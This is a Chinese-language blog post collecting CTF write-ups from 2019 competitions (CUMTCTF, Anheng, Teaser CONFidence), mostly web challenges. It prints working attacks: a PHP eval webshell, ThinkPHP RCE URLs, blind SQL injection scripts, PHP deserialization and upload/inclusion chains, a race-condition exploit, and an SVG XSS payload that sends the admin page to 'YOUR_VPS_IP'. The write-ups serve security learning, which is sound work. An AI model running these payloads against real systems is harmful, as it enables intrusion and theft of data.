---
title: 2019WriteUp 汇总
summary: CUMTCTF 双月赛I && CUMTCTF 双月赛II && 2019安恒一月月赛
featured-img: 2019-wp
layout: post
---

+ [CUMTCTF双月赛I](#cumtctf双月赛i)
+ [CUMTCTF双月赛II](#cumtctf双月赛ii)
+ [2019安恒一月月赛](#2019安恒一月月赛)
+ [Teaser CONFidence CTF](#teaser-confidence-ctf)

***

### CUMTCTF双月赛I

#### ez-upload

进入题目，要求上传一个`Webshell`到服务器，可知该题目考察文件上传漏洞，由于这是一个`PHP`服务器，所以我们需要上传一个`PHP Webshell`

点击浏览，选择文件，文件内容为`<?php @_eval($_POST['a']); ?>`，上传文件提示不允许上传该类型文件，故需要想办法绕过服务器安全限制

这里修改后缀名为`.phtml/.htaccess/.php5`均可

![](https://upload-images.jianshu.io/upload_images/11356161-3adbaf64d1574b84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后用菜刀连接上传的`Webshell`，读取根目录下的`flag`文件：

![](https://upload-images.jianshu.io/upload_images/11356161-b1b6074ea5977f73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



***

#### CVE

这道题提示了是一个CVE，所以我们需要到网上找该CMS的相关漏洞。该CMS为`Drupal` ，CVE编号为`cve-2018-7600`，参考这篇[文章](http://www.cnblogs.com/iamstudy/articles/drupal7_cve-2018-7600_code_exec.html)

构造第一个请求注入恶意代码：

![](https://upload-images.jianshu.io/upload_images/11356161-b560ca4696e11eeb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

将第一个请求的响应中`form-build-value`取出填入第二个请求，获得flag：

![](https://upload-images.jianshu.io/upload_images/11356161-adde27475c2baead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



***

#### secret-system

进入题目页面，访问`robots.txt`，可知登录页面URL

```
User-agent: *
Disallow: index.php?r=site/loginuser_1
```

查看登录页源代码可见提示：

```
<li><a href="/web/index.php?r=">login</a></li>
<li><a href="/web/index.php?r="></a></li></ul></div></div></nav>
    <div class="container">
                <!--
*** author: cib_zhinianyuxin.com
*** code: github.com
-->
<div class="site-loginuser_1">

    <form id="w0" action="/web/index.php?r=site/loginuser_1" method="post">
```

访问作者的`Github`仓库：`https://github.com/cumtxujiabin/secret-system`

看到提示：

```

1. you can use test/cib_sec to login ,but you are not admin!
2. only admin can upload file ,but whichone can not bypass my rules.

/**
$sign = array(
                    'id'=>$model->id,
                    'name'=>$model->username,
                    'sign'=>md5($model->id.$model->username),
                );
$_COOKIE['Cib_security'] = serialize($sign);
**/

```

可知：

+ 能以`test/cib_sec`账户登录
+ `Cookie`为`array`对象的序列化

所以我们可以尝试伪造序列化的数据，写PHP脚本：

```php
<?php
    $sign = array(
                    'id'=>"1",
                    'name'=>"admin",
                    'sign'=>md5("1"."admin"),
                );
	echo serialize($sign);
```

将`Cookie Cib_security`的value修改为`a:3:{s:2:"id";s:1:"1";s:4:"name";s:5:"admin";s:4:"sign";s:32:"6c5de1b510e8bdd0bc40eff99dcd03f8";}`即可获得管理员权限

接着发现页面存在Upload目录，进入后要求上传一个Webshell，又是一个文件上传漏洞，这里我们按照题1 的步骤上传，但是需要改后缀名为`.pht`，然后和题1一样，使用菜刀连接，读取flag



***



#### ezshop

进入题目，是一个商店，注册新用户发现我们有300积分，但是买flag需要888积分

接着我们下载题目给的压缩包，发现是网站的源代码，为`Python Django`框架，审计代码后在`/ezshop/payment/views.py`发现问题

![](https://upload-images.jianshu.io/upload_images/11356161-f43d5015460116a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这里接收到支付请求的逻辑为：

+ 查验签名是否正确
+ 调用`get_object_or_404`函数获取订单对象、商品对象、用户对象（以用户ID为参数）
+ 依次检查订单状态、商品状态、用户积分

而最重要的一点，它没有检查用户权限，所以我们可以利用这个漏洞来越权发起请求，即用别人的账户来支付我们的订单

但我们不知道谁的账户里有足够的钱来帮我们完成支付，所以我们查看网站代码压缩包里的数据库文件

![](https://upload-images.jianshu.io/upload_images/11356161-6fd105246e4e82af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

看到id为16的用户账户里有30000￥

故我们创建订单

![](https://upload-images.jianshu.io/upload_images/11356161-57ea06361b7f73bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

接着点击确认支付并开启BP抓包，由源码里我们知签名的构造是将密钥与POST请求请求体拼接后进行hash，

这里直接读取密钥文件会更好，因为密钥结尾有一个换行符

![](https://upload-images.jianshu.io/upload_images/11356161-9f85297923ae4abb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

获取签名后填入请求的查询字段，发起请求：

![](https://upload-images.jianshu.io/upload_images/11356161-d93a72d9db60861f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

看到订单成功支付，这时打开题目网站，查看商品flag



***

#### tp5

这是这几天爆出的ThinkPHP框架的CVE，可以看该[文章](https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce)

访问`http://219.219.61.234:10005/public/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=xxx&vars[1][]=xxx`即可执行任意代码

`http://219.219.61.234:10005/public/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`

`system("cat /flag")`获得flag

***

#### shell

进去题目，发现有一个登录框，注册用户后登录，发现可以上传图片

扫描网站后台，发现`/admin`目录，测试发现存在注入，为时间+正则盲注，注入脚本：

```python
import requests

url = "http://114.55.36.69:10006/admin/login.php"
# payload = "database()"  web
# payload = "password"

flag = ""

for i in range(1, 50):
    for j in "qazxswedcvfrtgbnhyjumkiolp1234567890{},_-!@#%&=':|<>":
        _data = {
                "username": f"admin' and if(mid(({payload}),{i},1) regexp '{j}',sleep(3),1)#",
                "password": "aaa"
            }
        try:
            r = requests.post(url, data=_data, timeout=3)
        except:
            flag += j
            break
    print(flag)
```

获得管理员密码后登录管理后台，发现存在`?file=CN.html`，猜想这里存在文件包含漏洞

联想到普通用户目录里的文件上传功能，我们得到解题思路：

+ 普通用户上传图片，图片中包含恶意php代码
+ 管理员目录中包含恶意文件，执行代码

这里的图片上传使用了`PHP GD`图片处理库（标志为上传的图片中包含`CREATOR: gd-jpeg v1.0 (using IJG JPEG v80)`），会对图片进行渲染，渲染失败会提示该文件不是`jpg`文件，且会过滤图片中的恶意内容

所以我们上传一个图片，然后再下载下来，对比两个图片的`Hex`，找出未被修改的部分，将那部分内容改写为我们的恶意代码，然后在admin目录中包含恶意文件，即可执行任意代码


#### BlockChain

zeppelin原题，delegatecall函数的漏洞

***

### CUMTCTF双月赛II

#### 签到

```
?0ver=001&0ver1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&0ver2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

***

#### SimpleUpload签到

console里`function checkFile(){;}`覆盖掉判断函数后上传

***

#### 小型线上赌场

.index.swp文件泄露

```python
import asyncio
import aiohttp

url = "http://202.119.201.199:32787/index.php?invest=1&guess=2"

async def guess():
    async with aiohttp.ClientSession() as session:
        while 1:
            async with session.get(url) as resp:
                data = await resp.text()
                if "flag{" in data:
                    print(data)
                    exit()


loop = asyncio.get_event_loop()
tasks = [guess() for i in range(8)]
loop.run_until_complete(asyncio.gather(*tasks))

```

***

#### SimpleSQLi

Sqlmap:

sqlmap -u xxx

***

#### SimpleSqli2

```python
import requests

#payload = "selSELECTect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'"
payload = "selSELECTect/**/binary/**/group_concat(FLAG)/**/from/**/flagishere"


flag = ''

for i in range(4, 50):
    for w in '_QAZXSWEDCVFRTGBNHYUJMKIOLP{}qazxscwderfvbgtyhnmjuiklop1234567890':
        url = f"http://bxs.cumt.edu.cn:30010/test/index.php?id=if(mid(({payload}),{i},1)='{w}',1,0)"
        # url = f"http://127.0.0.1/sql.php?id=if(mid(({payload}),{i},1)='{chr(w)}',1,0)"
        # print(url)
        r = requests.get(url)
        if 'NoNoNo' not in r.text:
            flag += w
            break
    print(flag)
```

***

#### 真的简单。。

`http://202.119.201.199:32793/list.php?id=-1' uniunionon seleselectct 1,2,(selselectect flag from flag)-- -`

获得flag in admin_08163314/exec.php     

后台命令执行：

```
`echo$IFS"Y2F0IC9mbGFnXzMzMTQvZmxhZw=="|base64$IFS-d`
```

***

#### 文件管理系统

源码泄露：www.zip

二次注入：

后台的建表语句为四个字段：

```sql
CREATE TABLE file(fid id()
                  filename xx
                  oldname xx
                  extension xx
                  )
```



上传文件名为：

`',extension='',filename='404.jpg.jpg`

upload.php上传时由于`addslashes`的原因单引号转义

插入表内的文件名：

filename = `',extension='',filename='404.jpg`

扩展名：

extension = `.jpg`

改名时的update语句为

```sql
update `file` set `filename`='404.jpg', `oldname`='',extension='',filename='404.jpg' where `fid`=x;

```

此时库中存在一个扩展名为空的记录

上传一个404.jpg

重命名为404.php

```php
$oldname = ROOT.UPLOAD_DIR . $result["filename"].$result["extension"];
$newname = ROOT.UPLOAD_DIR . $req["newname"].$result["extension"];
if(file_exists($oldname)) {
    rename($oldname, $newname);

```

空扩展名拼接后为原文件名，即可成功重命名为.php

***

#### BlockChain

ctf函数的两处require：

    require (takeRecord[msg.sender] == true);
    require (balances[msg.sender] == 0);

即领取过空投且收益为0

调用takeMoney即可满足第一个条件

而后需要调用transfer函数将钱转走，但是transfer被lock了，且时长为一年

而后阅读代码发现父类中的函数transferFrom也可转移

    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(_to != address(0));
第二个判断通过父类的approve函数来达成

```
function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
}

```

然后转移10**6 money，调用ctf函数即获得flag

***

#### Misc

#### BXS图标

查看发现是重排列的密码，猜测有意义的字符串获得flag

#### 矿大校歌

文件注释中有解压密码

解压后mp3stego提取隐藏文件

#### 起床改error

文件中隐藏压缩包

doc文件中查看隐藏字符即可

***

### 2019安恒一月月赛

#### Babygo

```php
<?php

class baby 
{   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct(){
        $this -> skyobj = new sec;
    }
    function __toString()      
    {          
        if (isset($this->skyobj))  
            return $this->skyobj->read();      
    }  
    function a(){
        $tmp = new baby();
        $tmp -> bbb = NULL;

        $this -> skyobj = new cool();
        $this -> skyobj -> amzing = serialize($tmp);
        $this -> skyobj -> filename = "flag.php";
    }
}  

class cool 
{    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()     
    {  
        $this->nice = unserialize($this->amzing);
        $this->nice->aaa = $sth;
        if($this->nice->aaa === $this->nice->bbb)
        {
            $file = "./{$this->filename}";        
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "you must be joking!"; 
            }    
        }
    }  
}  
  
class sec 
{  
    function read()     
    {          
        return "it's so sec~~";      
    }  
}



$obj = new baby();
$obj->a();


echo serialize($obj);
```

构造序列化payload，需注意protected成员序列化后的`%00*%00`

***

#### SimplePHP

查看robots.txt，访问/admin有注册登录页面

SQL长度约束，`username=admin                                                                                                                          1`登录

进入后利用TP注入漏洞：

```python
import requests

flag = ""
_cookies = {
	'PHPSESSID': # cookie
}

for i in range(1,50):
	for j in range(33, 128):
		url = f'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((mid((select flag from flag limit 0,1),{i},1)={chr(j)},sleep(3),0)--'
		try:
			r = requests.get(url, timeout=3, cookies=_cookies)
		except:
			flag += j
			break
    print(flag)
```

***

### Teaser CONFidence CTF

赛后复现，连接[https://confidence2019.p4.team/](https://confidence2019.p4.team/)

My Admin Panel我看做出来的人挺多就没看，复现了后两道Web题目

#### Web 50

一道XSS题目，注册后存在上传接口以及向管理员汇报Bug

使用SVG矢量图片格式，内嵌JS代码，由于上传执行，不存在SOP影响

EXP：

```javascript
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFx0lEQVR4nO3dQY7kNhAAQbex///y\n+uCzDlxnuaieiKvHao16EgS2QOrz+/fvv4D/5u/tG4BvICQICAkCQoKAkCAgJAgICQK/nv7D5/P5\nP+/jjz3Nwabv//Rzq/us5n633efb/96sSBAQEgSEBAEhQUBIEBASBIQEgcc50pOt/UvVHOO2uc3W\n555ev5oLTX9u5fT7siJBQEgQEBIEhAQBIUFASBAQEgSO50hPqv0kt81tqnlI9bmn13nylv0/T277\ne7MiQUBIEBASBIQEASFBQEgQEBIEsjnSbU7nM9Nziepz336e3reyIkFASBAQEgSEBAEhQUBIEBAS\nBL52jlTtI9qa/5yani9V1/nWeZQVCQJCgoCQICAkCAgJAkKCgJAgkM2RbpsPbN2P/T//mr7/256P\nFQkCQoKAkCAgJAgICQJCgoCQIHA8R3rLe3Wm98+8ZR/R1u87vR/sNlYkCAgJAkKCgJAgICQICAkC\nQoLA4xzptv0elWoecurt57/9tP1Fp6xIEBASBIQEASFBQEgQEBIEhASBz23/fn/b+W9bc6TT60x7\ny/6orZ+3IkFASBAQEgSEBAEhQUBIEBASBB73I03/u/uprfnA1j6cp/ucfs63zWe2zrU7fZ5WJAgI\nCQJCgoCQICAkCAgJAkKCwPF+pK350vS+oOnPrUzf/1vO35v+uzJHggVCgoCQICAkCAgJAkKCgJAg\n8DhH2prbTHvLXOinzd+m91OdMkeCBUKCgJAgICQICAkCQoKAkCDweK7dbftMKlv7VaZ/r+l9R5Wt\n90RNnx9oRYKAkCAgJAgICQJCgoCQICAkCBy/H+lU9e/9T97yvp1T03OS6nO33ot1+vPT37sVCQJC\ngoCQICAkCAgJAkKCgJAg8DhHevKt+3lOTc9PqutP7yu7be7kXDt4MSFBQEgQEBIEhAQBIUFASBA4\nniM9uW1fyul1pu//W03PCavva/r7tSJBQEgQEBIEhAQBIUFASBAQEgQ+37q/aPqct7c/h1O33efW\n8/d+JBgkJAgICQJCgoCQICAkCAgJAsdzpOMPWNo3svVeoNvc9pwrt+13siJBQEgQEBIEhAQBIUFA\nSBAQEgSOz7XbOr9u631Bb58XVT9/27youp/qOlYkCAgJAkKCgJAgICQICAkCQoLA4xxpa27wlvfk\nTJ+bd6r6vqb3p22dN3h6nVNWJAgICQJCgoCQICAkCAgJAkKCQHau3W37dm573870vprp61fefj6h\nc+1gkJAgICQICAkCQoKAkCAgJAg8zpFu21dz2z6WU9P7qU4/9zZbz79iRYKAkCAgJAgICQJCgoCQ\nICAkCBzPkbbmElvn133rnOe29x092dqvdXqfViQICAkCQoKAkCAgJAgICQJCgsD4HGl6HvWWc8+m\nr3Pbfq2tOdvWviYrEgSEBAEhQUBIEBASBIQEASFB4Nfp//D2c+S2TD+H257n1u+1tb/OigQBIUFA\nSBAQEgSEBAEhQUBIEHjcj/R2t73fafpzn9z2HLae85Nq7mRFgoCQICAkCAgJAkKCgJAgICQIHJ9r\nd5vb5mA/7TzAt5zXd8r7kWCBkCAgJAgICQJCgoCQICAkCByfa7c1tzmdG2zNGarnMz1vuW3+tnU/\n9iPBRYQEASFBQEgQEBIEhAQBIUHgeI70ZPqcsa3rnNraxzU9Zzudmz1d/7Z9RBUrEgSEBAEhQUBI\nEBASBIQEASFBIJsjvcXW+4K29gvdds5e9bmnpr93KxIEhAQBIUFASBAQEgSEBAEhQeDHzZGeTO9j\n2TqXb/q9RtO23o/kXDtYICQICAkCQoKAkCAgJAgICQLZHOm29+082ZqrTO//mT5H7rbr3Hb+oRUJ\nAkKCgJAgICQICAkCQoKAkCBwPEfaev9PZfocua19TdW5edXPP9naXzR9rqAVCQJCgoCQICAkCAgJ\nAkKCgJAg8HnLPiK4mRUJAkKCgJAgICQICAkCQoKAkCDwD+c9/xFIIxz6AAAAAElOSVSuQmCC" />
<script>
fetch('http://web50.zajebistyc.tf/profile/admin').then(o => o.text()).then(v => fetch('http://YOUR_VPS_IP/', {method: 'POST',
        body: JSON.stringify({k: v})}));
</script>
</svg>
```

这里踩了个坑，用GET发数据会超出最大字节限制

***

#### The Lottery

Golang的Chi框架，其实Golang的Web框架都是千篇一律的API，几乎都只是在重复模仿

这道题给了源码，是一个REST API，有以下路由

```go
r.Get("/", handler.IndexGet)
r.Post("/account", handler.AccountAdd)
r.Post("/account/{name}/amount", handler.AccountAddAmount)
r.Get("/account/{name}", handler.AccountGet)
r.Post("/lottery/add", handler.LotteryAdd)
r.Get("/lottery/results", handler.LotteryResults)
```

看看怎样能拿到flag：

```go
// 如果你是millionare或者你win了lottery

func (h *Handlers) AccountGet(w http.ResponseWriter, r *http.Request) {
	account, flag, err := h.service.AccountGet(chi.URLParam(r, "name"))
	if err != nil {
		if err == app.ErrNotFound {
			http.Error(w, err.Error(), http.StatusNotFound)
			return
		}
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	response := AccountGetResponse{
		Account: account,
	}
	if flag {
		response.Flag = h.flag
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(response)
}

func (s *Service) AccountGet(name string) (Account, bool, error) {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	account, found := s.accounts[name]
	if !found {
		return Account{}, false, ErrNotFound
	}
	superUser := s.lottery.IsWinner(name) || account.IsMillionaire()
	return account, superUser, nil
}

func (a *Account) IsMillionaire() bool {
	sum := 0
	for _, a := range a.Amounts {
		sum += a
	}
	return sum >= 1000000
}
```

彩票赢的条件是你账户所有的钱数(`MaxAmountsLen = 4`，int数组，最大长度为4)，加上一个大随机数正好等于0x133700

```go
for name, account := range accounts {
    amounts := append(account.Amounts, randInt(999913, 3700000))
    sum := 0
    for _, a := range amounts {
        sum += a
    }
    if sum == 0x133700 {
        l.winners[name] = struct{}{}
    }
}
```

百万富翁的条件，你可以添加你账户的钱，但是不能大于99：

```go
const MaxAmount  = 99

func (a *Account) AddAmount(amount int) error {
	if amount < 0 || amount > MaxAmount {
		return errors.Wrapf(ErrInvalidData, "amount must be positive and less than %d: got '%d'", MaxAmount+1, amount)
	}
	if len(a.Amounts) >= MaxAmountsLen {
		return errors.Wrapf(ErrInvalidData, "reached maximum number of amounts (%d)", MaxAmountsLen)
	}
	a.Amounts = append(a.Amounts, amount)
	return nil
}
```



漏洞利用思路学习自[https://github.com/mwarzynski/confidence2019_teaser_lottery](https://github.com/mwarzynski/confidence2019_teaser_lottery)

理一遍流程：

首先通过接口创建新账户，接着可以添加四次账户余额，然后注册账户参加赌博，最后查看结果，如果`isMillionare || amountTotal > 1000000`则会返回flag

我们看看赌博计算结果的函数

```go
func (l *Lottery) evaluate() {
	l.mutex.Lock()
	defer l.mutex.Unlock()
	accounts := l.accounts
	l.winners = make(map[string]struct{})
	l.accounts = make(map[string]Account)
	for name, account := range accounts {
		amounts := append(account.Amounts, randInt(999913, 3700000))
		sum := 0
		for _, a := range amounts {
			sum += a
		}
		if sum == 0x133700 {
			l.winners[name] = struct{}{}
		}
	}
}
```

它直接取出了用户结构体中的amounts来append，这里需要知道Go里的切片是什么，我原来写代码时就在这里踩过坑

```go
struct {
    ptr *T
    len int
    cap int
}
```

Go里有引用类型与值类型的区分，所有的引用类型其实都是一个包含指针的结构体。而切片的指针指向的是底层的数组（数组不可变，切片可变）

比如我这样操作的话

```go
array := [...]int{1, 2, 3}
s1 := array[:2]
s2 := array[2:]
```

这两个切片所引用的数组是同一个，我修改其中一个切片的结果是，另一个也会被修改

而append函数则是扩充切片，它创建一个新的切片结构体并返回。当没有达到cap（容量）限制时，它还是指向原先的数组，并将元素append到底层数组中，而超过容量限制后，则会创建一个新的底层数组，并且返回指向新数组的切片

且`append(slice)`操作并不是并发安全的，所以我们可以利用竞态条件，将赌博calc出的大随机数写入原始用户结构体余额数组

exp.py：

```python
import requests
import threading
import os


url = 'https://lottery.zajebistyc.tf'


def exp():
    s = requests.Session()
    r = s.post(url + '/account').json()
    user = r['name']
    
    for _ in range(3):
        r = s.post(url + f'/account/{user}/amount', json={'amount': 99})

    r = s.get(url + f'/account/{user}')
    r = s.post(url + f'/lottery/add', json={'accountName': user})
    r = s.post(url + f'/account/{user}/amount', json={'amount': 99})
    r = s.get(url + f'/account/{user}')

    print(r.text)
    if 'flag' in r.text:
        os._exit(0)


t = [threading.Thread(target=exp) for _ in range(30)]
[thread.start() for thread in t]
```

先向余额数组append三个值，然后注册赌博，赌博结算时间题目告知了`the LOTTERY_PERIOD on the server is 5s`，也就是每五秒钟向每个账户添加一个大随机数，所以我们需要在它append大随机数时也通过接口向同一个切片append，通过竞态条件使得我们调用接口append时修改底层数组的值被另一个coroutine里添加的大随机数覆盖，并且能够接收到新的切片结构体